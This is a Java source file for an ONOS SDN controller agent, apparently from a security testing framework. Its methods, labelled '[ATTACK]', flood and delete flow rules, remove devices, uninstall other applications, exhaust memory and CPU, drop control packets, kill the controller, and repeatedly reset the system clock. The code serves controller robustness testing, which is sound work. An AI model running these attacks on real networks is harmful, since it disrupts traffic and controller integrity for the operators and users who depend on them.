package org.deltaproject.onosagent;

import com.google.common.collect.Iterators;
import com.google.common.collect.Lists;
import org.apache.felix.scr.annotations.Activate;
import org.apache.felix.scr.annotations.Component;
import org.apache.felix.scr.annotations.Deactivate;
import org.apache.felix.scr.annotations.Property;
import org.apache.felix.scr.annotations.Reference;
import org.apache.felix.scr.annotations.ReferenceCardinality;
import org.onlab.metrics.MetricsService;
import org.onlab.packet.Ethernet;
import org.onlab.packet.Ip4Prefix;
import org.onlab.packet.IpAddress;
import org.onlab.packet.MacAddress;
import org.onosproject.app.ApplicationAdminService;
import org.onosproject.cfg.ComponentConfigService;
import org.onosproject.cfg.ConfigProperty;
import org.onosproject.cluster.ClusterAdminService;
import org.onosproject.cluster.ClusterService;
import org.onosproject.core.ApplicationId;
import org.onosproject.core.CoreService;
import org.onosproject.mastership.MastershipAdminService;
import org.onosproject.net.Device;
import org.onosproject.net.Host;
import org.onosproject.net.Link;
import org.onosproject.net.PortNumber;
import org.onosproject.net.device.DeviceAdminService;
import org.onosproject.net.device.DeviceClockService;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.flow.DefaultFlowRule;
import org.onosproject.net.flow.DefaultTrafficSelector;
import org.onosproject.net.flow.DefaultTrafficTreatment;
import org.onosproject.net.flow.FlowEntry;
import org.onosproject.net.flow.FlowRule;
import org.onosproject.net.flow.FlowRuleService;
import org.onosproject.net.flow.TrafficSelector;
import org.onosproject.net.flow.TrafficTreatment;
import org.onosproject.net.flow.criteria.Criterion;
import org.onosproject.net.flow.criteria.EthCriterion;
import org.onosproject.net.flow.criteria.PortCriterion;
import org.onosproject.net.flowobjective.DefaultForwardingObjective;
import org.onosproject.net.flowobjective.FlowObjectiveService;
import org.onosproject.net.flowobjective.ForwardingObjective;
import org.onosproject.net.host.HostAdminService;
import org.onosproject.net.host.HostService;
import org.onosproject.net.link.LinkAdminService;
import org.onosproject.net.link.LinkService;
import org.onosproject.net.packet.InboundPacket;
import org.onosproject.net.packet.PacketContext;
import org.onosproject.net.packet.PacketPriority;
import org.onosproject.net.packet.PacketProcessor;
import org.onosproject.net.packet.PacketService;
import org.onosproject.net.topology.TopologyService;
import org.osgi.framework.Bundle;
import org.osgi.framework.BundleContext;
import org.osgi.framework.BundleException;
import org.osgi.framework.ServiceReference;
import org.osgi.service.component.ComponentContext;
import org.osgi.service.component.ComponentInstance;
import org.slf4j.Logger;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Random;
import java.util.Set;

import static org.slf4j.LoggerFactory.getLogger;

/**
 * An App Agent Application for ONOS v1.9.0.
 */
@Component(immediate = true)
public class AppAgent {

    private static final int DEFAULT_TIMEOUT = 10;
    private static final int DEFAULT_PRIORITY = 10;

    private final Logger log = getLogger(getClass());

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected TopologyService topologyService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected FlowObjectiveService flowObjectiveService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected PacketService packetService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected HostService hostService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected FlowRuleService flowRuleService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected CoreService coreService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected ComponentConfigService cfgService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected LinkService linkService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected DeviceService deviceService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected MetricsService metricsService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected ClusterService clusterService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected DeviceClockService clockService;

    // for Admin Service
    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected HostAdminService hostadmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected DeviceAdminService deviceadmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected ApplicationAdminService appadmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected LinkAdminService linkadmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected ClusterAdminService clusteradmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected MastershipAdminService msadmin;

    private ReactivePacketProcessor processor = new ReactivePacketProcessor();

    @Property(name = "flowTimeout", intValue = DEFAULT_TIMEOUT,
            label = "Configure Flow Timeout for installed flow rules; " + "default is 10 sec")

    private int flowTimeout = DEFAULT_TIMEOUT;

    private ApplicationId appId;
    private AMInterface cm;
    private ComponentContext contextbk;
    private SystemTimeSetThread systemTimeThread;
    private boolean isDrop = false;
    private boolean isLoop = false;
    private Random ran = new Random();
    private PacketContext dropped = null;

    @Activate
    public void activate(ComponentContext context) {
        contextbk = context;
        // cfgService.registerProperties(getClass());

        appId = coreService.registerApplication("org.deltaproject.onosagent");

        packetService.addProcessor(processor, PacketProcessor.ADVISOR_MAX);

        TrafficSelector.Builder selector = DefaultTrafficSelector.builder();
        selector.matchEthType(Ethernet.TYPE_IPV4);
        packetService.requestPackets(selector.build(), PacketPriority.REACTIVE,
                appId);
        selector.matchEthType(Ethernet.TYPE_ARP);
        packetService.requestPackets(selector.build(), PacketPriority.REACTIVE,
                appId);

        log.info("Started with Application ID {}", appId.id());

        cm = new AMInterface(this);
        cm.start();
    }

    @Deactivate
    public void deactivate() {
        // cfgService.unregisterProperties(getClass(), false);
        flowRuleService.removeFlowRulesById(appId);
        packetService.removeProcessor(processor);
        processor = null;
        log.info("Stopped");
    }

    // Attack/Misuses
    public void testFlowRuleBlocking() {
        System.out.println("[ATTACK] Flow Rule Blocking");

        ArrayList<String> cpName = Lists.newArrayList(cfgService
                .getComponentNames());

        for (String s : cpName) {
            System.out.println(s);
            ArrayList<ConfigProperty> plist = Lists.newArrayList(cfgService
                    .getProperties(s));

            for (ConfigProperty p : plist) {
                System.out.println(p.name());
            }

        }

//        this.cfgService.setProperty(
//                "org.onosproject.provider.host.impl.HostLocationProvider",
//                "hostRemovalEnabled", "false");

        this.cfgService.setProperty(
                "org.onosproject.fwd.ReactiveForwarding",
                "packetOutOnly", "true");
    }


    // 2.1.060
    public String sendUnFlaggedFlowRemoveMsg(String cmd, long ruleId) {

        if (cmd.contains("install")) {
            TrafficTreatment.Builder treat = DefaultTrafficTreatment.builder();
            treat.drop();

            TrafficSelector.Builder selector = DefaultTrafficSelector.builder();
            selector.matchInPort(PortNumber.portNumber(1));
            selector.matchEthType((short) 0x0800);

            Iterable<Device> dvs = null;
            do {
                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                dvs = deviceService.getDevices();

            } while (!dvs.iterator().hasNext());

            while (dvs.iterator().hasNext()) {
                Device d = dvs.iterator().next();
                FlowRule newf = new DefaultFlowRule(d.id(),
                        selector.build(), treat.build(), 555,       // priority: 555
                        appId, flowTimeout, true, null);

                flowRuleService.applyFlowRules(newf);

                log.info("Install a flow rule : {} to {}", newf, d);

                String result = "Installed flow rule id|" + newf.id().value();
                return result;
            }
        } else if (cmd.contains("check")) {
            Iterable<FlowRule> flowRulesById = flowRuleService.getFlowRulesById(appId);

            Boolean result = true;

            for (FlowRule rule : flowRulesById) {
                if (rule.id().value() == ruleId) {
                    result = false;
                }
            }

            if (result) {
                return "success";
            } else {
                return "fail";
            }
        }

        return "fail";
    }


    public boolean setControlMessageDrop() {
        System.out.println("[ATTACK] Set Control Message Drop");
        isDrop = true;
        return true;
    }

    public String testControlMessageDrop() {
        System.out.println("[ATTACK] Start Control Message Drop");
        String drop = "";

        while (processor.getDropped() == null) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }

        InboundPacket in = processor.getDropped().inPacket();

        Ethernet eth = in.parsed();

        drop = processor.getDropped().toString();
        if (eth != null) {
            drop = eth.toString();
        } else {
            drop = in.toString();
        }

        System.out.println("[ATTACK] Dropped Message: " + drop);
        return drop;
    }

    public boolean setInfiniteLoop() {
        System.out.println("[ATTACK] Set Infinite Loop");
        this.isLoop = true;

        return true;
    }

    public static boolean testInfiniteLoop() {
        System.out.println("[ATTACK] Start Infinite Loop");
        int i = 0;

        while (i < 32767) {
            i++;

            if (i == 32766) {
                i = 0;
            }
        }
        return true;
    }

    public String testInternalStorageAbuse() {
        System.out.println("[ATTACK] Internal Storage Abuse");

        String removed = "nothing";

        Iterable<Device> dv = deviceService.getDevices();
        Iterator it = dv.iterator();

        if (it.hasNext()) {
            removed = "success|";
        }

        while (it.hasNext()) {
            Device piece = (Device) it.next();
            deviceadmin.removeDevice(piece.id());
            removed += piece.id() + "-" + piece.serialNumber() + "|";
        }

        System.out.println("[ATTACK] Device Remove: \n" + removed);
        Iterable<Link> links = linkService.getActiveLinks();
        it = dv.iterator();
        while (it.hasNext()) {
            Link link = (Link) it.next();
        }

        return removed;
    }

    public String testFlowRuleModification() {
        System.out.println("[ATTACK] Flow Rule Modification");
        Iterable<Device> dv = deviceService.getDevices();
        Iterator it = dv.iterator();

        String result = "";

        while (it.hasNext()) {
            Device piece = (Device) it.next();
            Iterable<FlowEntry> fe = flowRuleService.getFlowEntries(piece.id());
            Iterator f = fe.iterator();

            while (f.hasNext()) {
                FlowEntry old = (FlowEntry) f.next();
                TrafficTreatment.Builder treat = DefaultTrafficTreatment
                        .builder();

                FlowRule newf;
                newf = new DefaultFlowRule(old.deviceId(),
                        old.selector(), treat.build(), old.priority(),
                        appId, old.timeout(), false, old.payLoad());

                flowRuleService.removeFlowRules(old);
                flowRuleService.applyFlowRules(newf);

                result = "success|" + old.toString() + "\n ---> "
                        + newf.toString();
                System.out.println("\n[ATTACK] " + result + "\n");
            }
        }

        return result;
    }

    public String testFlowTableClearance() {
        System.out.println("[ATTACK] Flow Table Clearance");

        String flows = "nothing";

        int cnt = 1;
        /* forever */
        for (int i = 0; i < cnt; i++) {
            Iterable<Device> dv = deviceService.getDevices();
            Iterator it = dv.iterator();

            while (it.hasNext()) {
                Device piece = (Device) it.next();
                Iterable<FlowEntry> fe = flowRuleService.getFlowEntries(piece
                        .id());
                Iterator f = fe.iterator();

                while (f.hasNext()) {
                    FlowEntry e = (FlowEntry) f.next();
                    TrafficSelector select = e.selector();
                    Criterion c = select.getCriterion(Criterion.Type.ETH_TYPE);

                    flowRuleService.removeFlowRules(e);

                    try {
                        Thread.sleep(500);
                    } catch (InterruptedException e1) {
                        e1.printStackTrace();
                    }
                }
            }
        }

        return flows;
    }

    public boolean testEventListenerUnsubscription() {
        BundleContext bc = contextbk.getBundleContext();
        ComponentInstance ci = contextbk.getComponentInstance();

        Bundle[] blist = bc.getBundles();

        for (int i = 0; i < blist.length; i++) {
            Bundle bd = blist[i];
            bd.getRegisteredServices();

            ServiceReference[] servicelist = bd.getRegisteredServices();

//            for (ServiceReference sr : servicelist) {
//
//            }
        }

        return true;
    }

    public String testApplicationEviction(String appname) {
        System.out.println("[ATTACK] Application Eviction");
        boolean isRemoved = false;
        String result = "";

        BundleContext bc = contextbk.getBundleContext();

        Bundle[] blist = bc.getBundles();

        for (int i = 0; i < blist.length; i++) {
            Bundle bd = blist[i];
            bd.getRegisteredServices();

            if (bd.getSymbolicName().contains(appname)) {
                isRemoved = true;
                result = bd.getSymbolicName();

                System.out.println("[ATTACK] " + result + " is uninstalled!");

                try {
                    bd.uninstall();
                } catch (BundleException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }

        if (!isRemoved) {
            result = "fail";
        }

        return result;
    }

    public void testResourceExhaustionMem() {
        System.out.println("[ATTACK] Resource Exhausion : Mem");

        long[][] ary;
        ArrayList<long[][]> arry;

        arry = new ArrayList<long[][]>();

        while (true) {
            ary = new long[Integer.MAX_VALUE][Integer.MAX_VALUE];
            arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
            ary[ran.nextInt(Integer.MAX_VALUE)][ran.nextInt(Integer.MAX_VALUE)] = 1;
        }
    }

    public boolean testResourceExhaustionCpu() {
        System.out.println("[ATTACK] Resource Exhaustion : CPU");

        for (int count = 0; count < 100; count++) {
            CpuThread cpuThread = new CpuThread();
            cpuThread.start();
        }

        return true;
    }

    public boolean testSystemVariableManipulation() {
        System.out.println("[ATTACK] System Variable Manipulation");
        this.systemTimeThread = new SystemTimeSetThread();
        systemTimeThread.start();
        return true;
    }

    public boolean testSystemCommandExecution() {
        System.out.println("[ATTACK] System Command Execution");
        System.exit(0);

        return true;
    }

    public boolean testFlowRuleFlooding() {
        System.out.println("[ATTACK] Flow Rule Flooding");
        TrafficTreatment.Builder treat = DefaultTrafficTreatment.builder();
        TrafficSelector.Builder selector = DefaultTrafficSelector.builder();

        Iterable<Device> dv = deviceService.getDevices();
        Iterator it = dv.iterator();

        while (it.hasNext()) {
            Device piece = (Device) it.next();

            for (int i = 0; i < 32767; i++) {
                selector.matchEthDst(MacAddress.valueOf(ran.nextLong()));
                FlowRule newf = new DefaultFlowRule(piece.id(),
                        selector.build(), treat.build(), ran.nextInt(32767),
                        appId, flowTimeout, true, null);

                flowRuleService.applyFlowRules(newf);
            }
        }

        return true;
    }

    public String testSwitchFirmwareMisuse() {
        String result = "flows";

        System.out.println("\n\n[ATTACK] Switch Firmware Misuse");
        TrafficSelector.Builder selector = DefaultTrafficSelector.builder();

        Iterable<Device> dv = deviceService.getDevices();
        Iterator it = dv.iterator();

        while (it.hasNext()) {
            Device piece = (Device) it.next();
            Iterable<FlowEntry> fe = flowRuleService.getFlowEntries(piece.id());
            Iterator f = fe.iterator();

            while (f.hasNext()) {
                FlowEntry old = (FlowEntry) f.next();

                Criterion c = old.selector().getCriterion(Criterion.Type.ETH_TYPE);

                if (c != null) {
                    String type = c.toString();

                    /* MAC -> IP addr for IP packet */
                    if (type.contains("800")) {
                        EthCriterion dst = (EthCriterion) old.selector().getCriterion(Criterion.Type.ETH_DST);
                        EthCriterion src = (EthCriterion) old.selector().getCriterion(Criterion.Type.ETH_SRC);

                        if (dst != null && src != null) {
                            Set<Host> shost = hostService.getHostsByMac(src
                                    .mac());
                            Set<Host> dhost = hostService.getHostsByMac(dst
                                    .mac());
                            Host srcH = new ArrayList<Host>(shost).get(0);
                            Host dstH = new ArrayList<Host>(dhost).get(0);

                            Set<IpAddress> srcIpSet = srcH.ipAddresses();
                            Set<IpAddress> dstIpSet = dstH.ipAddresses();
                            IpAddress srcIP = new ArrayList<IpAddress>(srcIpSet)
                                    .get(0);
                            IpAddress dstIP = new ArrayList<IpAddress>(dstIpSet)
                                    .get(0);

                            Ip4Prefix matchIp4SrcPrefix = Ip4Prefix
                                    .valueOf(dstIP.toOctets(),
                                            Ip4Prefix.MAX_MASK_LENGTH);
                            Ip4Prefix matchIp4DstPrefix = Ip4Prefix
                                    .valueOf(srcIP.toOctets(),
                                            Ip4Prefix.MAX_MASK_LENGTH);

                            PortCriterion port = (PortCriterion) old.selector().getCriterion(
                                    Criterion.Type.IN_PORT);

                            selector.matchInPort(port.port())
                                    .matchIPSrc(matchIp4SrcPrefix)
                                    .matchIPDst(matchIp4DstPrefix);

                            FlowRule newf = new DefaultFlowRule(old.deviceId(),
                                    selector.build(), old.treatment(),
                                    old.priority(), this.appId, old.timeout(),
                                    false, null);

                            result = "Mac Address " + src.toString()
                                    + "\n--> IP Address " + srcIP.toString();

                            System.out.println("\n[ATTACK] " + result + "\n");

                            flowRuleService.removeFlowRules(old);
                            flowRuleService.applyFlowRules(newf);
                        }
                    }
                }
            }
        }
        return result;
    }

    /**
     * Packet processor responsible for forwarding packets along their paths.
     */
    private class ReactivePacketProcessor implements PacketProcessor {
        public PacketContext droppedPacket = null;

        public PacketContext getDropped() {
            return droppedPacket;
        }

        public void process(PacketContext context) {
            if (isDrop) {
                if (droppedPacket == null) {
                    droppedPacket = context;
                }

                InboundPacket ip = context.inPacket();
                Ethernet eth = ip.parsed();
                System.out.println("Drop Packet Info: ");
                System.out.println(eth.toString() + "\n");

                context.block();
            } else if (isLoop) {
                AppAgent.testInfiniteLoop();
            }
        }
    }

    /**
     * Thread class for a resource exhaustion attack.
     */
    private final class CpuThread extends Thread {
        private int result = 2;
        private int cnt = 0;

        @Override
        public void run() {
            while (true) {
                result = result ^ 2;
                cnt++;

                if (cnt == 1000) {
                    cnt = -1;
                }
            }
        }
    }

    /**
     * Thread class for a system variable manipulation.
     */
    private final class SystemTimeSetThread extends Thread {
        private Runtime rt;
        private String[] dateInfo;
        private int day;
        private final String[] month = {"Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Dep", " Oct", "Nov",
                "Dec"};
        private int year;
        private Random rand;

        public SystemTimeSetThread() {
            rt = Runtime.getRuntime();
            dateInfo = new String[3];
            rand = new Random();

        }

        @Override
        public void run() {
            while (true) {
                day = rand.nextInt(29) + 1;
                year = rand.nextInt(100) + 1970;
                dateInfo[0] = String.valueOf(day);
                dateInfo[1] = month[rand.nextInt(11)];
                dateInfo[2] = String.valueOf(year);
                try {
                    Process proc = rt.exec(new String[] {"date", "-s", dateInfo[0] + " " + dateInfo[1] + " "
                            + dateInfo[2]});
                    BufferedReader br = new BufferedReader(new InputStreamReader(
                            proc.getInputStream()));
                    System.out.println("System time setting info : "
                            + br.readLine());
                    Thread.sleep(500);
                } catch (IOException e) {
                    // TODO Auto-generated catch block
                    System.out.println("System set error");
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }
    }

}
